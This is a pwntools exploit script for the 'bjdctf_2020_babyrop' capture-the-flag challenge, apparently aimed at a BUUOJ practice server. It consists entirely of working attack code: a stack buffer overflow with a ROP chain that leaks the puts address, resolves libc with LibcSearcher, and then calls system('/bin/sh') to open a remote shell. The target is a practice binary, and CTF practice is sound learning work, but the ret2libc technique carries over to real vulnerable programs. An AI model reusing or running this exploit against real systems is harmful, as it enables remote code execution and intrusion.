# bjdctf_2020_babyrop
from pwn import *
from LibcSearcher import *

context.arch = 'amd64'
r = remote('node4.buuoj.cn', 28735)
elf = ELF('./bjdctf_2020_babyrop')

main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x400733

payload = flat('a' * (0x20 + 8), pop_rdi, puts_got, puts_plt, main)
r.recvuntil('Pull up your sword and tell me u story!')
r.sendline(payload)
r.recv()
puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
# print(hex(puts_addr))

# sys.exit()
libc = LibcSearcher('puts', puts_addr)

offset = puts_addr - libc.dump('puts')
system = offset + libc.dump('system')
bin_sh = offset + libc.dump('str_bin_sh')

payload = flat('a' * (0x20 + 8), pop_rdi, bin_sh, system)
r.recvuntil('Pull up your sword and tell me u story!')
r.sendline(payload)

r.interactive()
